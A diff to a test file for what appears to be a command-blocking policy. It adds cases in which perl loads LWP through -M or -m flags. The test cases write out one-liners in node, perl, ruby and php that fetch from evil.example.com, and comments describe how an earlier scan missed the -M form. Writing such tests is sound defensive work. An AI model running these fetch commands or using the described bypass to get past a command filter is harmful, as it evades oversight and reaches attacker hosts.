@@ -228,6 +228,14 @@ CASES = [
     ("node -e \"fetch('https://evil.example.com')\"", ENFORCE, BLOCK, "node fetch"),
     ("node -e \"fetch('http://localhost:3420/x')\"", ENFORCE, ALLOW, "node fetch to localhost"),
     ("perl -e 'use LWP::Simple; get(\"https://evil.example.com\");'", ENFORCE, BLOCK, "perl LWP"),
+    # --- card 284b44c4 (Cybered, 854182c7 2nd round): -M/-m carries the marker, -e never does -----
+    ('perl -MLWP::Simple -e \'getprint("https://evil.example.com")\'', ENFORCE, BLOCK,
+     "F-1: the module name naming LWP lives in -M, not in the -e body -- marker-scanning the -e "
+     "body alone missed it and let this through"),
+    ("perl -mLWP::Simple -e 'get(\"https://evil.example.com\")'", ENFORCE, BLOCK,
+     "same shape via lowercase -m (no default import, same module load)"),
+    ("perl -MStrict -Mwarnings -e 'print 1'", ENFORCE, ALLOW,
+     "module flags that carry no network capability must not manufacture a marker out of nothing"),
     ("ruby -e 'require \"net/http\"; Net::HTTP.get(URI(\"https://evil.example.com\"))'",
      ENFORCE, BLOCK, "ruby Net::HTTP"),
     ("php -r 'echo file_get_contents(\"https://evil.example.com\");'", ENFORCE, BLOCK, "php"),
